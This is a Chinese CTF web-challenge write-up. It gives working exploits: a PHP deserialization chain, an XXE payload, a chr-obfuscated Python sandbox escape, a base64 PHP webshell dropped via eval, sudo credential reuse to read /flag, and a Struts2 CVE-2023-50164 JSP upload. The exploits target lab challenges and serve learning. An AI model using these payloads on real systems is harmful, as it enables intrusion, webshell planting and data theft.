INSERT INTO mess VALUES (1, '羊毛都让你薅光了'), (2, '好吃不贵');

CREATE USER 'ctf_user'@'localhost' IDENTIFIED BY 'ctf_password_114514';

GRANT SELECT, UPDATE ON shop.goods TO 'ctf_user'@'localhost';

DELIMITER //
CREATE DEFINER=`root`@`localhost` PROCEDURE `buy_item`(IN item_id INT, IN user_money DECIMAL(10,2))
SQL SECURITY DEFINER 
BEGIN
DECLARE current_price INT;
    DECLARE final_message VARCHAR(100);

    SELECT price INTO current_price FROM goods WHERE id = item_id;

    IF current_price <= user_money THEN
        SELECT mess INTO final_message FROM mess WHERE id = item_id;
        SELECT current_price AS current_price, final_message AS final_message;
    ELSE
        SELECT 0 AS current_price, '余额不足，你需要更多的钱或者更便宜的商品' AS final_message;
    END IF;
END //
DELIMITER ;

GRANT EXECUTE ON PROCEDURE shop.buy_item TO 'ctf_user'@'localhost';

FLUSH PRIVILEGES;
```

修改数据库中flag的价格,再返回根目录购买即可

```Bash
mysql -u ctf_user -p ctf_password_114514 shop -e "UPDATE goods SET price = 0.00 WHERE id = 3;"
```

![img](https://my.feishu.cn/space/api/box/stream/download/asynccode/?code=ZmFmMDU0ZGIyNjdjMWQ1MTQ3MWYzMTczMWZhMzQ4YjlfTXE1TlpVbDBYRFp1b1ZNTDdCWXhWdHpIWmNXbk9oR2xfVG9rZW46R1oxc2IzQTlCb3F5ZzJ4SnI3amNnR0tkbnB6XzE3NzIzOTcwMzE6MTc3MjQwMDYzMV9WNA)

其他解法:上传一句话木马，蚁剑连接后把原来的index.php删除，修改价格后上传新的index.php

## **Go**

简单的页面，dirsearch也没扫出东西

![img](https://my.feishu.cn/space/api/box/stream/download/asynccode/?code=NGNhYzI0ZDk1MDA3MzQyNTAzMWZjYmYzZjk1YzQ1YzBfMHdNN2tGdXYyWnVYb1NHR1U1c0FaaDUya2RwTk01TzhfVG9rZW46UEtkeWJIZUxYb0dYTTR4UTl3V2NORXlJbmtmXzE3NzIzOTcwMzE6MTc3MjQwMDYzMV9WNA)

改json格式，尝试role字段被墙了

![img](https://my.feishu.cn/space/api/box/stream/download/asynccode/?code=ZWExMDUzM2NmZjJlNmU0NzlkNjg0YjkwYzE0ZWU5MTRfVVBxZkVMZ0tSdDhqYnhlb3lGT2FJVzdIRWtiWVBxYlVfVG9rZW46VVJhbmJhZHFQb0MyVFV4aVNnNmM3aDRYbjdiXzE3NzIzOTcwMzE6MTc3MjQwMDYzMV9WNA)

"Go 标准库中的 JSON、XML（以及流行的第三方 YAML）解析器在处理非受信数据时，存在一些设计上或默认行为上的“特性”，这些“特性”在特定场景下很容易被攻击者利用，演变成严重的安全漏洞。此处Go JSON 解析器最关键的缺陷之一，因为它与几乎所有其他主流语言的 JSON 解析器行为都不同（它们通常是严格大小写敏感的）。攻击者可以轻易构造 payload"

尝试大小写绕过

![img](https://my.feishu.cn/space/api/box/stream/download/asynccode/?code=Njc5YWMwNmJlNzVhMjI4OGNmNzBiMTY3MWZjMDRkZTdfUmtvRU1aaFdxeVFXME43c2RQdENpbHVpUzl1VTVUU29fVG9rZW46TFNtVmI5Um9qb2VQVjh4WTMzaWM4VjY0bjRoXzE3NzIzOTcwMzE6MTc3MjQwMDYzMV9WNA)

## **Ezphp**

进去看到源码

```PHP
<?php

highlight_file(__FILE__);
error_reporting(0);

class Sun{
    public $sun;
    public function __destruct(){
        die("Maybe you should fly to the ".$this->sun);
    }
}

class Solar{
    private $Sun;
    public $Mercury;
    public $Venus;
    public $Earth;
    public $Mars;
    public $Jupiter;
    public $Saturn;
    public $Uranus;
    public $Neptune;
    public function __set($name,$key){
        $this->Mars = $key;
        $Dyson = $this->Mercury;
        $Sphere = $this->Venus;
        $Dyson->$Sphere($this->Mars);
    }
    public function __call($func,$args){
        if(!preg_match("/exec|popen|popens|system|shell_exec|assert|eval|print|printf|array_keys|sleep|pack|array_pop|array_filter|highlight_file|show_source|file_put_contents|call_user_func|passthru|curl_exec/i", $args[0])){
            $exploar = new $func($args[0]);
            $road = $this->Jupiter;
            $exploar->$road($this->Saturn);
        }
        else{
            die("Black hole");
        }
    }
}

class Moon{
    public $nearside;
    public $farside;
    public function __tostring(){
        $starship = $this->nearside;
        $starship();
        return '';
    }
}

class Earth{
    public $onearth;
    public $inearth;
    public $outofearth;
    public function __invoke(){
        $oe = $this->onearth;
        $ie = $this->inearth;
        $ote = $this->outofearth;
        $oe->$ie = $ote;
    }
}



if(isset($_POST['travel'])){
    $a = unserialize($_POST['travel']);
    throw new Exception("How to Travel?");
}
```

序列化调用链为Sun.__destruct()->Moon.__tostring()->Earth.__invoke()->Solar.__set()->Solar.__call()，然后在call方法中调用 SplFileObject::fpassthru() 直接输出内容

问题在于反序列化执行后抛出了异常，此时程序非正常退出，不会触发`__destruct()`

这种一般要利用PHP的GC机制强制执行`__destruct()`方法，原理为通过反序列化时覆盖对象，使对象无法被引用，触发GC

PHP在反序列化时，允许数组内的键是重复的，后面的重复键会覆盖前一个。思路就是序列化一个有两个元素的数组，将第二个元素设置为任意值，再手动将空元素的索引调整为0，此时就会覆盖前一个元素，相当于该对象刚被实例化出来位置就没了，自然无法被引用，自然就触发了`__destruct()`

展示一下自己的exp

```PHP
<?php

class Sun{
    public $sun;
}

class Solar{
    private $Sun;
    public $Mercury;
    public $Venus;
    public $Earth;
    public $Mars;
    public $Jupiter;
    public $Saturn;
    public $Uranus;
    public $Neptune;
}

class Moon{
    public $nearside;
    public $farside;
}

class Earth{
    public $onearth;
    public $inearth;
    public $outofearth;
}

$a = new Sun();
$a->sun = new Moon();
$a->sun->nearside = new Earth();
$a->sun->nearside->onearth = new Solar();
$a->sun->nearside->inearth = "placeholder";
$a->sun->nearside->outofearth = '/flag'; //args
$a->sun->nearside->onearth->Venus = "SplFileObject" ;//func
$a->sun->nearside->onearth->Mercury = new Solar();
$a->sun->nearside->onearth->Mercury->Jupiter = "fpassthru";
$a->sun->nearside->onearth->Mercury->Saturn = 0;

$a = serialize($a);
$b = 'a:2:{i:0;' . $a . ';i:0;i:0;}';

echo urlencode($b);

?>
```

![img](https://my.feishu.cn/space/api/box/stream/download/asynccode/?code=ZWY2MmI1YWZmNGNlMDYxN2JkNDdhNjY4Yjg1MTA1OThfZDVtcnlHaGRNNVBtMzZia1Fpbjlwc0NDUjBTVFFKVjRfVG9rZW46Qk1KZGJLOVR4bzNsZFl4SHFHY2NWa1RzbndMXzE3NzIzOTcwMzE6MTc3MjQwMDYzMV9WNA)

## **Mini Blog**

/create接口的上传格式为xml，简单打XXE(其实没抓包第一反应是XSS来着...

```XML
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE cillo [
<!ETITY flag SYSTEM "file:///flag">
]>
<post><title>cillo</title><content>&flag;</content></post>
```

## **Eazy_Pyrunner**

存在目录穿越，访问`?file=app.py`得源码

![img](https://my.feishu.cn/space/api/box/stream/download/asynccode/?code=NTUwZjI2ZDVjOGY5Y2U1YTIxY2VkYWQwNDAwZTdkNzNfTHY2aTVieUFsZmVSYXJRMTRNa2Q5clZySm1iaW5QRzZfVG9rZW46TWhQMWI1NDFRb252cVV4QmFadGNTZVdObkdFXzE3NzIzOTcwMzE6MTc3MjQwMDYzMV9WNA)

审计代码，不难发现我们的python代码放到一个小沙箱中执行然后返回结果，考虑打python沙箱逃逸

```Python
from flask import Flask, render_template_string, request, jsonify
import subprocess
import tempfile
import os
import sys

app = Flask(__name__)


@app.route('/')
def index():
    file_name = request.args.get('file', 'pages/index.html')
    try:
        with open(file_name, 'r', encoding='utf-8') as f:
            content = f.read()
    except Exception as e:
        with open('pages/index.html', 'r', encoding='utf-8') as f:
            content = f.read()

    return render_template_string(content)


def waf(code):
    blacklisted_keywords = ['import', 'open', 'read', 'write', 'exec', 'eval', '__', 'os', 'sys', 'subprocess', 'run','flag', '\'', '\"']
    for keyword in blacklisted_keywords:
        if keyword in code:
            return False
    return True


@app.route('/execute', methods=['POST'])
def execute_code():
    code = request.json.get('code', '')

    if not code:
        return jsonify({'error': '请输入Python代码'})

    if not waf(code):
        return jsonify({'error': 'Hacker!'})

    try:
        with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
            f.write(f"""import sys

sys.modules['os'] = 'not allowed'

def is_my_love_event(event_name):
    return event_name.startswith("Nothing is my love but you.")

def my_audit_hook(event_name, arg):
    if len(event_name) > 0:
        raise RuntimeError("Too long event name!")
    if len(arg) > 0:
        raise RuntimeError("Too long arg!")
    if not is_my_love_event(event_name):
        raise RuntimeError("Hacker out!")

__import__('sys').addaudithook(my_audit_hook)

{code}""")
            temp_file_name = f.name

        result = subprocess.run(
            [sys.executable, temp_file_name],
            capture_output=True,
            text=True,
            timeout=10
        )

        os.unlink(temp_file_name)

        return jsonify({
            'stdout': result.stdout,
            'stderr': result.stderr
        })

    except subprocess.TimeoutExpired:
        return jsonify({'error': '代码执行超时（超过10秒）'})
    except Exception as e:
        return jsonify({'error': f'执行出错: {str(e)}'})
    finally:
        if os.path.exists(temp_file_name):
            os.unlink(temp_file_name)


if __name__ == '__main__':
    app.run(debug=True)
```

`print(list(dict(vars()).keys()))`查看沙箱中能利用的内置函数

![img](https://my.feishu.cn/space/api/box/stream/download/asynccode/?code=NDg3ZDRjNGYyYzE1NzE1MWU4MjkxYjExOGFlMTVlYTRfUExESTZpZWppS2loT04ycVllMmJjVm1TalFhQ3BLUnpfVG9rZW46RFBTN2JGRjRJb0dVZTN4U0M2b2NuS2Y4bkpmXzE3NzIzOTcwMzE6MTc3MjQwMDYzMV9WNA)

waf包含了单引号,双引号和下划线，可以通过`chr()`构造

```Python
#__class__
print(str().join(chr(x) for x in [0x5f, 0x5f, 0x63, 0x6c, 0x61, 0x73, 0x73, 0x5f, 0x5f]))
```

当我们提交代码后，服务端会将其包裹在一个带有审计钩子的环境中：

审计钩子检查 `len(event_name) > 0` 和 `len(arg) > 0` 这意味着我们触发的事件都会被组织

```Python
def my_audit_hook(event_name, arg):
    if len(event_name) > 0:
        raise RuntimeError("Too long event name!")
    if len(arg) > 0:
        raise RuntimeError("Too long arg!")
    if not is_my_love_event(event_name):
        raise RuntimeError("Hacker out!")

__import__('sys').addaudithook(my_audit_hook)
```

审计钩子的触发方法为`len`和`is_my_love_event`，我们可以重新定义，进行覆盖，这样钩子就无效了

```Python
len = lambda event: 0
is_my_love_event = lambda event: True
```

接下来就是构造payload了,有点像SSTI

思路是拿到包含 os 模块的`_wrap_close`类再通过__init__.__globals__获取system，也可以在本地跑沙箱环境拿类对应的索引值(大概

```Python
clss = str().join(chr(x) for x in [0x5f,0x5f,0x63,0x6c,0x61,0x73,0x73,0x5f,0x5f])      # __class__
mro = str().join(chr(x) for x in [0x5f,0x5f,0x6d,0x72,0x6f,0x5f,0x5f])                # __mro__
sclss = str().join(chr(x) for x in [0x5f,0x5f,0x73,0x75,0x62,0x63,0x6c,0x61,0x73,0x73,0x65,0x73,0x5f,0x5f])  # __subclasses__
it = str().join(chr(x) for x in [0x5f,0x5f,0x69,0x6e,0x69,0x74,0x5f,0x5f])           # __init__
gl = str().join(chr(x) for x in [0x5f,0x5f,0x67,0x6c,0x6f,0x62,0x61,0x6c,0x73,0x5f,0x5f])  # __globals__

ss = str().join(chr(x) for x in [0x73,0x79,0x73,0x74,0x65,0x6d])   # system
s = str().join(chr(x) for x in [0x73,0x79,0x73])                    # os
cmd = str().join(chr(x) for x in [0x2f,0x72,0x65,0x61,0x64,0x5f,0x66,0x6c,0x61,0x67])  # /read_flag

wrapc = str().join(chr(x) for x in [0x5f,0x77,0x72,0x61,0x70,0x5f,0x63,0x6c,0x6f,0x73,0x65])  # _wrap_close
ne = str().join(chr(x) for x in [0x5f,0x5f,0x6e,0x61,0x6d,0x65,0x5f,0x5f])  # __name__

for i in getattr(getattr(getattr([], clss), mro)[1], sclss)():
    try:
        if wrapc == str(getattr(i, ne)):
            len = lambda x: 0
            is_my_love_event = lambda x: True
            t = getattr(getattr(i,it),gl)[ss](cmd)
            print(t)
    except Exception as e:
        print(e)
        break
```

cmd自己构造就行，根目录下的/flag是没有读取权限的

![img](https://my.feishu.cn/space/api/box/stream/download/asynccode/?code=MTEzNWY1MDE3YTMyZGE1YWY3ZDQwMTgzZDc3ZDQyYTVfbENvam5Bc2F4VEpubXNSVHd3SkY0WENpRGdabldVR2hfVG9rZW46VGtnd2JVZkpzb1ZuRXl4Z0I3RGNTTzF3bnYwXzE3NzIzOTcwMzE6MTc3MjQwMDYzMV9WNA)

## **ez_race**

既然题目已经提示条件竞争了就去寻找延迟条件作为竞争窗口,看到`time.sleep(1.0)`

```Python
def form_valid(self, form):
    amount = form.cleaned_data["amount"]
    with transaction.atomic():
        time.sleep(1.0)
        user = models.User.objects.get(pk=self.request.user.pk)
        if user.money >= amount:
            user.money = F('money') - amount
            user.save()
            models.WithdrawLog.objects.create(user=user, amount=amount)
    
    user.refresh_from_db()
    if user.money < 0:
        return HttpResponse(os.environ.get("FLAG", "flag{flag_test}"))
        
    return redirect(self.get_success_url())
```

首先调用`form.cleaned_data["amount"]`检查`amount`的值

```Python
def clean_amount(self):
    amount = self.cleaned_data["amount"]
    if amount > self.user.money:
        raise forms.ValidationError("余额不足")
    return amount
```

使用了 with transaction.atomic(): 开启事务，但紧接着执行了 time.sleep(1.0)。这个 1 秒的延迟为条件竞争提供了极大的窗口条件竞争提供了极大的窗口

tip:`with transaction.atomic():` 是 Django 中用于实现数据库事务原子性的核心语法。它的作用是：确保代码块中的所有数据库操作要么全部成功提交，要么在发生错误时全部回滚，绝不留下中间状态。

虽然使用了事务，但如果在高并发情况下，多个请求同时通过了 forms.py 的余额校验，并进入了 form_valid 的 sleep 阶段。

当 sleep 结束，代码执行 user.money = F('money') - amount 时，尽管 F 表达式在数据库层面是原子的，但由于之前的余额校验已经失效（多个请求都认为自己有足够的钱），最终会导致余额被多次扣除。

`if user.money < 0: return HttpResponse(os.environ.get("FLAG", "flag{flag_test}"))`使得金额变为负数得到flag，这里可以直接在BP设置五个线程发空包再访问/flag路由

![img](https://my.feishu.cn/space/api/box/stream/download/asynccode/?code=NjM5ZGExOTE1ZTNjYWMyNjZiMmRlYTU3ODI1MjYzNjNfNXVPaFhWS1dOWUhEczl2cnprOWJKUUZyWEU2MWlkRHVfVG9rZW46UFN3OGJQakxzb3pFZXJ4M2RESWNSMWF0bnpoXzE3NzIzOTcwMzE6MTc3MjQwMDYzMV9WNA)

![img](https://my.feishu.cn/space/api/box/stream/download/asynccode/?code=M2JkNzgyODgxMDBhZTA2ZDUwOWI0MmM4MTEyZjJjNDBfRW1KSVJnQ2NaV216S3UxUVl5U0lsUkduZVRzTkllZkRfVG9rZW46RjFacmJGeXVtb1hSUzJ4ZlhVdGNUeG90bkNZXzE3NzIzOTcwMzE6MTc3MjQwMDYzMV9WNA)

当然也可以自己写竞争脚本，注意线程设置少一些

## sudoooo0

目录扫描发现webshell.php接口，get传递cmd能触发`eval()`,发现存在/flag但是无法打开

![img](https://my.feishu.cn/space/api/box/stream/download/asynccode/?code=MTQ1YzQ5M2JjOTZhZjRlZDUwOTgxNmY0ZWU0N2EwOWNfVEZNUmNaRWRCS2ZZcWFYYWNEa3FVaXJ0Qm53QzNvcFJfVG9rZW46RWhLaWJjc0l6b2czRzl4VUp3b2NXNnlmbnVlXzE3NzIzOTcwMzE6MTc3MjQwMDYzMV9WNA)

写一个马上传，蚁剑连接

```HTTP
view-source:challenge.shc.tf:30465/webshell.php?cmd=system("echo PD9waHAKZXZhbCgkX1BPU1RbInBhc3MiXSk7Cg== | base64 -d > new.php");
```

![img](https://my.feishu.cn/space/api/box/stream/download/asynccode/?code=NzQzOGFkZTQyNDk4ZDBhNzNjMDQ2NmY5MDhiOTdlZWZfdDR4YmtDalRLVjZiY25QTzRuYjFDSVRSWUswd1MzQUdfVG9rZW46WEljaWJhRkFUb2hyUUJ4QWRreGNxRk1xbmRoXzE3NzIzOTcwMzE6MTc3MjQwMDYzMV9WNA)

题目提示sudo提权？尝试无果

![img](https://my.feishu.cn/space/api/box/stream/download/asynccode/?code=MmJiMDViY2MyYzFlZmM5YThjYTM2MmRhN2E0ZWQ1ZDRfWFU2a2pqd3RlUmVTTEI4aldzQjV3MERDOU9RWHFkSDJfVG9rZW46UXBsYmJ2dkNJb1dlTFd4WDZ6Z2NDVVFpbkRiXzE3NzIzOTcwMzE6MTc3MjQwMDYzMV9WNA)

`ps -ef`查看是否有root权限运行的进程，在PID：25确实存在sudo命令

![img](https://my.feishu.cn/space/api/box/stream/download/asynccode/?code=MTYxMmFlNjFmOTQ2YmRkOGViNzYwZDMyYzA5NjQwYzZfM3JMQ1NsWldJZHQ2d2t2cTJZS3psRDIzbjdWVWhBUmhfVG9rZW46SlVFRmJDWUxib2VpS3Z4aTJuaWM2RG9VbkhUXzE3NzIzOTcwMzE6MTc3MjQwMDYzMV9WNA)

我们来解析`script -q -f -c bash -li -c "echo ZsQ | sudo -S -v >/dev/null 2>&1; sleep infinity" /dev/null`这个命令

- `script -q -f -c ... /dev/null`   
  - `script` 命令可以用作交互终端会话过程的记录，保留用户输入和系统输出的全过程
  - -q 安静运行模式
  - -f 把会话记录附加到typescript文件或指定的文件后面(即/dev/null)，保留先前的内容,即立即刷新输出
  - -c 运行指定的命令而非交互shell
- `echo ZsQ | sudo -S -v >/dev/null 2>&1`
  - `echo ZsQ`：输出字符串 ZsQ（sudo 密码）
  - `|`：通过管道将密码传给 sudo
  - -S：从 stdin 读取密码即ZsQ
  - -v：仅验证密码并更新时间戳（不执行具体命令）成功后，未来 15 分钟内 sudo 无需再输密码
  - `>/dev/null`：将标准输出重定向到 /dev/null
  - `2>&1`将标准错误重定向到标准输出
- `sleep infinity` 当前进程无限期地暂停但不退出

通过Sudo 凭据重用，复用语句执行读取/flag

```Bash
script -q -f -c 'echo ZsQ | sudo -S cat /flag' /dev/null
```

![img](https://my.feishu.cn/space/api/box/stream/download/asynccode/?code=OTFjMmZlMTM3ODE4NmMwZmYyNmJmNDNhZTA3YmU0NDhfRnQ1dmpOb0N5UFdxOUtnWFRvT09ZejV6ZHgyODhObjVfVG9rZW46RUFsdGIybG1xb2tmemt4TVR5c2NLbXk4bmplXzE3NzIzOTcwMzE6MTc3MjQwMDYzMV9WNA)

## **BabyJavaUpload**

上传普通文件访问文件路径回显404，尝试修改目录回显500

![img](https://my.feishu.cn/space/api/box/stream/download/asynccode/?code=NzhmNmE4NTZhZmIzNjk1OGQ3NzJlMGE5MzhlY2Q4YTRfNlZ4amFuS3RNZlp0NUNET0lkMnZyNWdQb2ZRQkhoMGtfVG9rZW46UVpXcmIzZjJ2b2tuZ0V4RkFqZ2NyeXQxbmVoXzE3NzIzOTcwMzE6MTc3MjQwMDYzMV9WNA)

根据报错信息可以确定后端使用的是struts2框架，打[CVE-2023-50164](https://xz.aliyun.com/news/12618)

'该漏洞在文件上传的时候允许攻击者控制参数，进行目录穿越让文件落地到任何位置，可以将原参数name="myfile"修改成name="Myfile"，再添加一个小写的myfileFileName，这样在调用set方法时，由于TreeMap在迭代时会先输出大写，这样再输出小写，就能对先前的大写set的参数进行覆盖'

通过操纵表单字段名称的大小写，让struts2框架错误地将jsp文件上传至非预期目录

```Java
<%@ page import="java.nio.file.Files, java.nio.file.Paths" %>
<%= new String(Files.readAllBytes(Paths.get("/flag"))) %>
```

可以看到文件名已经修改为根目录下的1.jsp

![img](https://my.feishu.cn/space/api/box/stream/download/asynccode/?code=MDUxYzM4NjljODJjM2UzOTY0MWUyYTgxMWYxNzYwYTdfMVJvRncySHVkMElMaUZKdEZlSk4wUk81ZFYzaGRpRHdfVG9rZW46QjdLOWJKdlVYb1lTc2J4RXk5WmNDaUZ2blliXzE3NzIzOTcwMzE6MTc3MjQwMDYzMV9WNA)

![img](https://my.feishu.cn/space/api/box/stream/download/asynccode/?code=MDhmNWUyNGQ4OTY2NGRiZTk4YTI3NmFlZWI3ZjljZjNfaDIydHVSc3RnUmVMUW8xbXhXNUN1TEZCTlBKbFFxakpfVG9rZW46S3psQ2J3TVBlb0dueXN4NU05T2NqWWM1bjBkXzE3NzIzOTcwMzE6MTc3MjQwMDYzMV9WNA)

## **你也懂java？**

还没有系统地学习Java反序列化，第一次打跟着简单学习一下

先看容器提供的源码

当收到一个 POST /upload 请求时，从请求体中反序列化一个 Java 对象（使用 ObjectInputStream）；检查该对象是否为 Note 类型；如果 Note 对象的 filePath 属性不为 null：读取该 filePath 指定的本地文件内容；

最后将文件内容通过 echo() 方法输出（推测为返回给客户端）

```Java
public void handle(HttpExchange exchange) throws IOException {
    String method = exchange.getRequestMethod();
    String path = exchange.getRequestURI().getPath();

    if ("POST".equalsIgnoreCase(method) && "/upload".equals(path)) {
        try (ObjectInputStream ois = new ObjectInputStream(exchange.getRequestBody())) {
            Object obj = ois.readObject();
            if (obj instanceof Note) {
                Note note = (Note) obj;
                if (note.getFilePath() != null) {
                    echo(readFile(note.getFilePath()));
                }
            }
        } catch (Exception e) {}
    }
}
```

附件提供了Note类的构造

```Java
import java.io.Serializable;

public class Note implements Serializable {
    private static final long serialVersionUID = 1L;

    private String title;
    private String message;
    private String filePath;

    public Note(String title, String message, String filePath) {
        this.title = title;
        this.message = message;
        this.filePath = filePath;
    }

    public String getTitle() {
        return title;
    }

    public String getMessage() {
        return message;
    }

    public String getFilePath() {
        return filePath;
    }
}
```

（我去这么简单吗╰(*°▽°*)╯，这比赛好照顾新人QAQ

```Java
import java.io.*;

public class SerializeDemo {
    public static void main(String[] args) {
        Note note = new Note("123","456","/flag");
        try
        {
            FileOutputStream fileOut = new FileOutputStream("D:\\Task\\shctf.db");
            ObjectOutputStream out = new ObjectOutputStream(fileOut);
            out.writeObject(note);
            out.close();
            fileOut.close();
        }
        catch (IOException i)
        {
            i.printStackTrace();
        }
    }
}
```

![img](https://my.feishu.cn/space/api/box/stream/download/asynccode/?code=ZDI5NWM5ZDM5M2MxZGRhMDUzODVjODlmYjdiZjNiOTZfRzQ2RXN1aURwaXpkVzhTckZxWHNoZ2pwNHI5T3pZcE5fVG9rZW46SUo1cWJMOHlEb2hZdHR4NnA0S2NZbkp0bnllXzE3NzIzOTcwMzE6MTc3MjQwMDYzMV9WNA)